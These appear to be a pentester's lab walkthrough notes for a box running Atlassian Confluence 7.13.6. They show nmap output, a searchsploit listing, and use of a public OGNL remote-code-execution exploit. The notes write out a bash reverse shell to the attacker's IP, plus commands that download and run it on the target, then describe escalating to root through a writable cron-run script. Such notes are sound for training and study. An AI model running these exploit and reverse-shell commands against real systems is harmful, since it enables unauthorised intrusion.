22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-favicon: Unknown favicon MD5: 966E60F8EB85B7EA43A7B0095F3E2336
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?


port 8090.  Atlassian Confluence 7.13.6
<img width="1459" height="545" alt="image" src="https://github.com/user-attachments/assets/3a8add99-efb7-44ce-80c5-1834ee37af3a" />
                                                                                                                                                                                                                                                                  | xml/webapps/39170.txt
Atlassian Confluence 6.15.1 - Directory Traversal                                                                                                                                                                                                                                                                                     | jsp/webapps/47635.rb
Atlassian Confluence 7.12.2 - Pre-Authorization Arbitrary File Read                                                                                                                                                                                                                                                                | jsp/webapps/40989.txt
Atlassian Confluence < 8.5.3 - Remote Code Execution                                                                                                                                               
Atlassian Confluence AppFusions Doxygen 1.3.0 - Directory Traversal                                                                                                                                                                                                                                                          
Atlassian Confluence Widget Connector Macro - SSTI                                                                                                                                                                                                                                                                           
Confluence Data Center 7.18.0 - Remote Code Execution (RCE)                                                                                                                                           
Confluence Server 7.12.4 - 'OGNL injection' Remote Code Execution (RCE) (Unauthenticated)                    

Confluence Data Center 7.18.0 - Remote Code Execution (RCE)  this worked
https://www.exploit-db.com/exploits/50952
<img width="1001" height="523" alt="image" src="https://github.com/user-attachments/assets/737215fd-20ec-4d4a-ad46-4cc34377e7e0" />
└─$ cat shell.sh                       
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.162/22 0>&1

python3 50952 -u http://192.168.157.41:8090 -c "curl http://192.168.45.162/shell.sh -o /tmp/shell.sh"
python3 50952 -u http://192.168.157.41:8090 -c "bash /tmp/shell.sh"
funnily if i run the bash script straight into the command. it DOESNT RUN.
<img width="1127" height="221" alt="image" src="https://github.com/user-attachments/assets/0907146e-5257-4d1f-a5ae-95ef4d63250d" />

i cheated and used cpfail. lets see the intended
pspy shows that root is running a cron. eventhough its not on crontab. it runs /opt/log-backup.sh
<img width="839" height="226" alt="image" src="https://github.com/user-attachments/assets/c5eec9dd-1f8e-4cf6-b588-61e48498396d" />
and we have write on that file
<img width="635" height="43" alt="image" src="https://github.com/user-attachments/assets/5f6dc02d-cc19-49d9-b37a-92e2abe0a567" />
<img width="524" height="53" alt="image" src="https://github.com/user-attachments/assets/cce8186a-0ed7-404a-a2f0-f11b532c96f7" />
<img width="1053" height="308" alt="image" src="https://github.com/user-attachments/assets/775fb495-40de-4805-a383-b0350474a00d" />


